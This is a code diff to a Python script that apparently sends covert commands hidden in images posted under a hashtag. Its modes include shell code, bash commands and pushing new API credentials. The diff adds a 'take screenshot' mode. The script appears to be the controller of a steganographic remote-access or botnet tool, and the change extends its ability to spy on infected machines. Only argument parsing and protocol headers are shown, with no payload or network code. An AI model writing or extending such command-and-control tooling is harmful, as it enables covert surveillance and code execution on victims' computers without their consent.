@@ -18,6 +18,7 @@ parser.add_argument('-image','--image', dest='image', help='The image where the 
 group = parser.add_mutually_exclusive_group(required=True)
 group.add_argument('-s', '--shell-code', dest='shell_code',help='Set to shell code mode', action='store_true')
 group.add_argument('-b', '--bash-command', dest='bash_command', help='Set to bash command mode', action='store_true')
+group.add_argument('-ts', '--take-screenshot', dest='take_screenshot', help='Set to take screenshot mode', action='store_true')
 group.add_argument('-nc', '--new-creds', dest='new_creds', help='Push new api credentials', action='store_true')
 group = parser.add_mutually_exclusive_group(required=True)
 group.add_argument('-m', '--message', dest='message', help='The message to insert in the image')
@@ -31,6 +32,7 @@ hashtag = args.hashtag
 image = args.image
 shell_code_mode = args.shell_code 
 bash_command_mode = args.bash_command
+take_screenshot_mode = args.take_screenshot
 new_creds_mode = args.new_creds
 wait_for_reply = args.wait_for_reply
 
@@ -41,6 +43,8 @@ if(shell_code_mode):
     protocol_header = "SHELL_CODE:"
 elif(bash_command_mode):
     protocol_header = "BASH_COMMAND:"
+elif(take_screenshot_mode):
+    protocol_header = "TAKE_SCREENSHOT:"
 elif(new_creds_mode):
     protocol_header = "NEW_CREDS:"
     extra_hashtag = " #NEW_CREDENTIALS "
@@ -53,6 +57,7 @@ print("+    Image: " + image)
 print("+    Hashtag: " + hashtag)
 print("+    Shell Code Mode: " +  str(shell_code_mode))
 print("+    Bash Command Mode: " +  str(bash_command_mode))
+print("+    Take Screenshot Mode: " +  str(take_screenshot_mode))
 print("+    New Credentials Mode: " +  str(new_creds_mode))
 
 # Import YAML
